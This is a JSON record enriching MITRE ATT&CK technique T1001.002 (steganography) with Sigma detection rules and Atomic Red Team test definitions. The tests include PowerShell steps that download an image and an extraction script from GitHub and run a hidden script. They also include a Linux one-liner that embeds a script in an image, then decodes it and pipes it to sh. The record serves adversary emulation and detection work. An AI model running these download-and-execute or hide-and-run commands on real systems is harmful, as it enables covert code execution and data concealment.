{
    "id": "T1001.002",
    "name": "Steganography",
    "description": "Adversaries may use steganographic techniques to hide command and control traffic to make detection efforts more difficult. Steganographic techniques can be used to hide data in digital messages that are transferred between systems. This hidden information can be used for command and control of compromised systems. In some cases, the passing of files embedded using steganography, such as image or document files, can be used for command and control.",
    "platforms": "Linux, macOS, Windows",
    "kill_chain_phases": "Command and Control",
    "data_sources": "Network Traffic: Network Traffic Content",
    "detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)",
    "url": "https://attack.mitre.org/techniques/T1001/002",
    "enrichments": {
        "attack_rule_map": [
            {
                "tech_id": "T1001.002",
                "atomic_attack_guid": "4ff61684-ad91-405c-9fbc-048354ff1d07",
                "atomic_attack_name": "Execute Embedded Script in Image via Steganography",
                "platform": "Linux",
                "sigma_rules": [
                    {
                        "rule_name": "Linux Base64 Encoded Pipe to Shell",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_base64_execution.yml",
                        "remote_content": "title: Linux Base64 Encoded Pipe to Shell\nid: ba592c6d-6888-43c3-b8c6-689b8fe47337\nstatus: test\ndescription: Detects suspicious process command line that uses base64 encoded input for execution with a shell\nreferences:\n    - https://github.com/arget13/DDexec\n    - https://www.mandiant.com/resources/blog/barracuda-esg-exploited-globally\nauthor: pH-T (Nextron Systems)\ndate: 2022-07-26\nmodified: 2023-06-16\ntags:\n    - attack.defense-evasion\n    - attack.t1140\nlogsource:\n    product: linux\n    category: process_creation\ndetection:\n    selection_base64:\n        CommandLine|contains: 'base64 '\n    selection_exec:\n        - CommandLine|contains:\n              - '| bash '\n              - '| sh '\n              - '|bash '\n              - '|sh '\n        - CommandLine|endswith:\n              - ' |sh'\n              - '| bash'\n              - '| sh'\n              - '|bash'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate administration activities\nlevel: medium\n"
                    },
                    {
                        "rule_name": "Linux Shell Pipe to Shell",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_susp_pipe_shell.yml",
                        "remote_content": "title: Linux Shell Pipe to Shell\nid: 880973f3-9708-491c-a77b-2a35a1921158\nstatus: test\ndescription: Detects suspicious process command line that starts with a shell that executes something and finally gets piped into another shell\nreferences:\n    - Internal Research\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-03-14\nmodified: 2022-07-26\ntags:\n    - attack.defense-evasion\n    - attack.t1140\nlogsource:\n    product: linux\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|startswith:\n            - 'sh -c '\n            - 'bash -c '\n    selection_exec:\n        - CommandLine|contains:\n              - '| bash '\n              - '| sh '\n              - '|bash '\n              - '|sh '\n        - CommandLine|endswith:\n              - '| bash'\n              - '| sh'\n              - '|bash'\n              - ' |sh'\n    condition: all of selection*\nfalsepositives:\n    - Legitimate software that uses these patterns\nlevel: medium\n"
                    }
                ]
            }
        ],
        "cycat": {
            "cycat": {
                "cycat_related_uuids": [
                    "eec23884-3fa1-4d8a-ac50-6f104d51e235"
                ],
                "lookup_results": [
                    {
                        "uuid": "eec23884-3fa1-4d8a-ac50-6f104d51e235",
                        "lookup_data": {
                            "mitre-attack-id": "T1001.002",
                            "mitre-cti:description": "Adversaries may use steganographic techniques to hide command and control traffic to make detection efforts more difficult. Steganographic techniques can be used to hide data in digital messages that are transferred between systems. This hidden information can be used for command and control of compromised systems. In some cases, the passing of files embedded using steganography, such as image or document files, can be used for command and control. ",
                            "mitre-cti:name": "Steganography",
                            "mitre-cti:type": "attack-pattern",
                            "raw": "{'x_mitre_platforms': ['Linux', 'macOS', 'Windows'], 'x_mitre_domains': ['enterprise-attack'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'id': 'attack-pattern--eec23884-3fa1-4d8a-ac50-6f104d51e235', 'type': 'attack-pattern', 'created': '2020-03-15T00:37:58.963Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1001.002', 'url': 'https://attack.mitre.org/techniques/T1001/002'}, {'url': 'https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf', 'description': 'Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.', 'source_name': 'University of Birmingham C2'}], 'modified': '2020-03-15T00:37:58.963Z', 'name': 'Steganography', 'description': 'Adversaries may use steganographic techniques to hide command and control traffic to make detection efforts more difficult. Steganographic techniques can be used to hide data in digital messages that are transferred between systems. This hidden information can be used for command and control of compromised systems. In some cases, the passing of files embedded using steganography, such as image or document files, can be used for command and control. ', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'command-and-control'}], 'x_mitre_detection': 'Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)', 'x_mitre_is_subtechnique': True, 'x_mitre_version': '1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'x_mitre_data_sources': ['Network Traffic: Network Traffic Content']}",
                            "_cycat_type": "Item"
                        }
                    }
                ]
            }
        },
        "atomics": [
            {
                "attack_technique": "T1001.002",
                "display_name": "Data Obfuscation via Steganography",
                "atomic_tests": [
                    {
                        "name": "Steganographic Tarball Embedding",
                        "auto_generated_guid": "c7921449-8b62-4c4d-8a83-d9281ac0190b",
                        "description": "This atomic test, named \"Steganographic Tarball Embedding\", simulates the technique of data obfuscation via steganography by embedding a tar archive file (tarball) \nwithin an image.\n\nThe test begins by ensuring the availability of the image file and the tarball file containing data . It then generates random passwords and saves them to a \nfile. Subsequently, the tarball file is created, containing the passwords file. The test executor command reads the contents of the image \nfile and the tarball file as byte arrays and appends them together to form a new image file. This process effectively embeds the tarball \nfile within the image, utilizing steganography techniques for data obfuscation.\n\nThis atomic test simulates the technique of data obfuscation via steganography, enabling attackers to clandestinely transfer files across systems undetected. \nBy embedding the tarball file within the image, adversaries can obscure their activities, facilitating covert communication and data exfiltration.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "image_file": {
                                "description": "Image file which will be downloaded to be used to hide data",
                                "type": "path",
                                "default": "PathToAtomicsFolder\\T1001.002\\bin\\T1001.002.jpg"
                            },
                            "tar_file": {
                                "description": "Tarz file containing random passwords",
                                "type": "path",
                                "default": "$env:PUBLIC\\Downloads\\T1001.002.tarz"
                            },
                            "new_image_file": {
                                "description": "new image file ready for extraction",
                                "type": "path",
                                "default": "$env:PUBLIC\\Downloads\\T1001.002New.jpg"
                            },
                            "passwords_file": {
                                "description": "Text file containing random passwords",
                                "type": "path",
                                "default": "$env:TEMP\\random_passwords.txt"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "Image file must exist\n",
                                "prereq_command": "if (!(Test-Path \"#{image_file}\")) {exit 1} else {\n{exit 0}\n}\n",
                                "get_prereq_command": "New-Item -Type Directory (split-path \"#{image_file}\") -ErrorAction ignore | Out-Null\nWrite-Output \"Downloading image file...\"\n$imageUrl = \"https://github.com/raghavsingh7/Pictures/raw/a9617d9fce289909441120a1e0366315c2c5e19d/lime.jpg\"\nInvoke-WebRequest -Uri $imageUrl -OutFile \"#{image_file}\"\n"
                            },
                            {
                                "description": "File to hide within tarz file must exist\n",
                                "prereq_command": "if (!(Test-Path \"#{passwords_file}\")) {exit 1} else {\n{exit 0}\n}\n",
                                "get_prereq_command": "Write-Output \"Generating random passwords and saving to file...\"\n$passwords = 1..10 | ForEach-Object { -join ((1..12) | ForEach-Object { @('A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z') + @('a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z') + @('0','1','2','3','4','5','6','7','8','9') + @('!','@','#','$','%','^','&','*','(','(',')','-','=','+','_','[',']','{','}','|',';',';',':',',','<','>','?') | Get-Random }) }\n$passwords | Out-File -FilePath \"#{passwords_file}\"    \n"
                            },
                            {
                                "description": "Tarz file to embed in image must exist \n",
                                "prereq_command": "if (!(Test-Path \"#{tar_file}\")) {exit 1} else {\n{exit 0}\n}\n",
                                "get_prereq_command": "Write-Output \"Generating tarz file...\"\ntar -cvf \"#{tar_file}\" \"#{passwords_file}\"\n"
                            }
                        ],
                        "executor": {
                            "name": "powershell",
                            "elevation_required": true,
                            "command": "Get-Content \"#{image_file}\", \"#{tar_file}\" -Encoding byte -ReadCount 0 | Set-Content \"#{new_image_file}\" -Encoding byte\n",
                            "cleanup_command": "Set-ExecutionPolicy Bypass -Scope Process -Force -ErrorAction Ignore\nRemove-Item -Path \"#{new_image_file}\" -Force -ErrorAction Ignore\n"
                        }
                    },
                    {
                        "name": "Embedded Script in Image Execution via Extract-Invoke-PSImage",
                        "auto_generated_guid": "04bb8e3d-1670-46ab-a3f1-5cee64da29b6",
                        "description": "This atomic test demonstrates the technique of data obfuscation via steganography, where a PowerShell script is concealed within an image file. \nThe PowerShell script is embedded using steganography techniques, making it undetectable by traditional security measures. The script is hidden \nwithin the pixels of the image, enabling attackers to covertly transfer and execute malicious code across systems.\n\nThe test begins by ensuring the availability of the malicious image file and the Extract-Invoke-PSImage script. The test proceeds to extract the hidden \nPowerShell script (decoded.ps1) from the image file using the Extract-Invoke-PSImage tool. The extracted script is then decoded from base64 encoding and saved as a \nseparate PowerShell (textExtraction.ps1). Consequently, the textExtraction.ps1 script is executed.\n\nIn the case of this atomic test, the malicious image file which is downloaded has the powershell command Start-Process notepad embedded within in base64. This\nis done to emulate an attackers behaviour in the case they were to execute malware embedded within the image file. \n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "image_file": {
                                "description": "Malicious Image file which will be downloaded",
                                "type": "path",
                                "default": "PathToAtomicsFolder\\T1001.002\\bin\\evil_kitten.jpg"
                            },
                            "psimage_script": {
                                "description": "Extract-Invoke-PSImage Script downloaded",
                                "type": "path",
                                "default": "PathToAtomicsFolder\\ExternalPayloads\\Extract-Invoke-PSImage.ps1"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "Image file must exist\n",
                                "prereq_command": "if (!(Test-Path \"#{image_file}\")) {exit 1} else {\n{exit 0}\n}\n",
                                "get_prereq_command": "New-Item -Type Directory (split-path \"#{image_file}\") -ErrorAction Ignore | Out-Null\nWrite-Output \"Downloading image file...\"\n$imageUrl = \"https://github.com/raghavsingh7/Pictures/raw/f73e7686cdd848ed06e63af07f6f1a5e72de6320/evil_kitten.jpg\"\nInvoke-WebRequest -Uri $imageUrl -OutFile #{image_file}\n"
                            },
                            {
                                "description": "Extract-Invoke-PSImage must exist\n",
                                "prereq_command": "if (!(Test-Path \"#{psimage_script}\")) {exit 1} else {\n{exit 0}\n}\n",
                                "get_prereq_command": "New-Item -Path \"PathToAtomicsFolder\\ExternalPayloads\\\" -ItemType Directory -Force | Out-Null\nWrite-Output \"Downloading Extract-Invoke-PSImage.ps1 script...\"\n$scriptUrl = \"https://github.com/raghavsingh7/Extract-Invoke-PSImage/raw/7d8c165d2f9bfe9c3965181079b7c82e03168ce1/Extract-Invoke-PSImage.ps1\"\nInvoke-WebRequest -Uri $scriptUrl -OutFile #{psimage_script}\n"
                            }
                        ],
                        "executor": {
                            "name": "powershell",
                            "elevation_required": true,
                            "command": "cd \"PathToAtomicsFolder\\ExternalPayloads\\\"\nImport-Module .\\Extract-Invoke-PSImage.ps1\n$extractedScript=Extract-Invoke-PSImage -Image \"#{image_file}\" -Out \"$HOME\\result.ps1\"\n$scriptContent = Get-Content \"$HOME\\result.ps1\" -Raw\n$base64Pattern = \"(?<=^|[^A-Za-z0-9+/])(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}(==)?|[A-Za-z0-9+/]{3}=)?(?=$|[^A-Za-z0-9+/])\"\n$base64Strings = [regex]::Matches($scriptContent, $base64Pattern) | ForEach-Object { $_.Value }\n$base64Strings | Set-Content \"$HOME\\decoded.ps1\"\n$decodedContent = Get-Content \"$HOME\\decoded.ps1\" -Raw\n$decodedText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($decodedContent))\n$textPattern = '^.+'  \n$textMatches = [regex]::Matches($decodedText, $textPattern) | ForEach-Object { $_.Value }\n$scriptPath = \"$HOME\\textExtraction.ps1\"\n$textMatches -join '' | Set-Content -Path $scriptPath\n. \"$HOME\\textExtraction.ps1\"\n",
                            "cleanup_command": "Set-ExecutionPolicy Bypass -Scope Process -Force -ErrorAction Ignore\nRemove-Item -Path \"$HOME\\result.ps1\" -Force -ErrorAction Ignore \nRemove-Item -Path \"$HOME\\textExtraction.ps1\" -Force -ErrorAction Ignore\nRemove-Item -Path \"$HOME\\decoded.ps1\" -Force -ErrorAction Ignore        \n"
                        }
                    },
                    {
                        "name": "Execute Embedded Script in Image via Steganography",
                        "auto_generated_guid": "4ff61684-ad91-405c-9fbc-048354ff1d07",
                        "description": "This atomic test demonstrates the execution of an embedded script in an image file using steganography techniques. The script is first encoded in base64 and then embedded within the pixels of the image. The modified image is created, and the script is extracted and executed on the target system.",
                        "supported_platforms": [
                            "linux"
                        ],
                        "input_arguments": {
                            "script": {
                                "description": "Shell Script file to be embedded and executed",
                                "type": "String",
                                "default": "PathToAtomicsFolder/script.sh"
                            },
                            "evil_image": {
                                "description": "The modified image with embedded script",
                                "type": "String",
                                "default": "PathToAtomicsFolder/evil_image.jpg"
                            },
                            "image": {
                                "description": "Image file to be embedded",
                                "type": "String",
                                "default": "PathToAtomicsFolder/image.jpg"
                            }
                        },
                        "executor": {
                            "command": "cat \"#{script}\" | base64 | xxd -p | sed 's/../& /g' | xargs -n1 | xxd -r -p | cat \"#{image}\" - > \"#{evil_image}\"; strings \"#{evil_image}\" | tail -n 1 | base64 -d | sh",
                            "cleanup_command": "rm \"#{evil_image}\"",
                            "name": "sh",
                            "elevation_required": false
                        }
                    }
                ]
            }
        ]
    },
    "timestamp": "2025-02-28 10:33:28"
}